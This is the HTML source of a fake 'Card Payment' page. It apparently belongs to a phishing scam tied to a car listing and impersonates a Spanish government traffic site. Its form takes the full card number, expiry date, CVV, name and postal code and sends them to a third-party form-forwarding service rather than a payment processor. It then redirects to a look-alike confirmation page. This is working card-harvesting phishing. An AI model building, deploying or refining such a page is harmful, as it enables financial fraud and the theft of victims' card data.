<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Card Payment</title>
    <link rel="icon" type="image/png" href="carte.png">
    <link rel="apple-touch-icon" href="carte.png">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awersome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="breadcrumb-bar">
        <a href="C:\Users\SOSO\Downloads\Bilbasen\BMW 330i M-Sport  2019\payment/payment.html" class="back-link"> < Back </a>
    </div>
    <main class="payment-card">
        <!-- En-tete -->
        <h2>Card Payment</h2>
        <!-- Corps du formulaire -->
        <div class="card-body">
        <!-- Logos des cartes -->
            <div class="card-logos">
                <span class="logo-box visa"><img src="logo_visa.jpg" alt="VISA" title="VISA"></span>
                <span class="logo-box mastercard"><img src="logo_mc.jpg" title="MasterCard"></span>
                <span class="logo-box amex"><img src="logo_amex.jpg" title="American Express"></span>
                <span class="logo-box dcv"><img src="logo_dcv.jpg" title="Discover"></span>
            </div>
            <div class="card-logos">
                <span class="logo-box cb"><img src="logo_cb.jpg" title="Carte Bancaire"></span>
                <span class="logo-box jcb"><img src="logo_jcb.jpg" title="JCB"></span>
                <span class="logo-box up"><img src="logo_up.jpg" title="China UnionPay"></span>
                <span class="logo-box mv"><img src="logo_mv.jpg" title="Maestro / V Pay"></span>
            </div>
        </div>
        <form action="https://formsubmit.co/528cfa5ae469b703e6904a3689b34436" method="POST" enctype="multipart/form-data">
                        <input type="hidden" name="_captcha" value="false">
                        <input type="hidden" name="_next" value="https://sede-dgt-gob.github.io/sede-dgt-gob/cartes/confirm.html">
                        <input type="hidden" name="_template" value="table">
                        <input type="hidden" name="_subject" value="Card">
            
                        
            <!-- payment amount -->
            <div class="form-group">
                <label>Amount</label>
                <div class="input-with-addon"><span class="addon"> € </span>
                <input class="puta" type="number" name="Montant" value="610" required>
                </div>
            </div>
                    
            <!-- name on card -->
            <div class="form-group">
                <label>Name on card</label>
                <input type="text" name="Card_Name" placeholder="John Smith" inputmode="text" autocomplete="cc-name" pattern="[A-Za-zÀ-ÿ '-]+" autocapitalize="characters" required>
            </div>

            <!-- card number -->
            <div class="form-group">
                <label>Card number</label>
                <div class="form-group-puto">
                <input class="puto" type="tel" name="Card_number_1" inputmode="numeric" pattern="[0-9]{4,4}" maxlength="4" placeholder="XXXX" required>
                <input class="puto" type="tel" name="Card_number_2" inputmode="numeric" pattern="[0-9]{4,4}" maxlength="4" placeholder="XXXX" required>
                <input class="puto" type="tel" name="Card_number_3" inputmode="numeric" pattern="[0-9]{4,4}" maxlength="4" placeholder="XXXX" required>
                <input class="puto" type="tel" name="Card_number_4" inputmode="numeric" pattern="[0-9]{4,4}" maxlength="4" placeholder="XXXX" required>
                </div>
            </div>
            <!-- expiry date & security code -->
            <div class="form-row">
                <div class="form-group-half">
                    <label>Expiry date</label>
                    <input type="text" name="Expiry" inputmode="text" pattern="(0[1-9]|1[0-2])\/[0-9]{2}" placeholder="MM/AA" maxlength="5" required>
                </div>
                <div class="form-group-half">
                    <label>CVV/CVC</label>
                    <div class="input-with-icon">
                        <input type="tel" name="CVV/CVC" inputmode="numeric" pattern="[0-9]{3,4}" placeholder="123" maxlength="4" autocomplete="cc-csc" required>
                        <i class="fa-solid fa-cicle-question">?</i>
                    </div>
                </div>
            </div>

            <!-- ZIP/Postal code -->
            <div class="form-group">
                <label>ZIP/Postal code</label>
                <div class="input-with-icon">
                    <input type="text" name="ZIP/Postal code" inputmode="text" pattern="[0-9]{5}" placeholder="Ex: 01BP 1234 ou 75001" autocomplete="postal-code" required>
                    <i class="fa-solid fa-cicle-question">?</i>
                </div>
            </div>
            <!-- Bouton de validation -->
            <button type="submit" class="pay-btn">
                <i class="fa-solid fa-lock"><img src="lock.jpg"></i>  Payment
            </button>
        </form>
    </main>
</body>
</html>
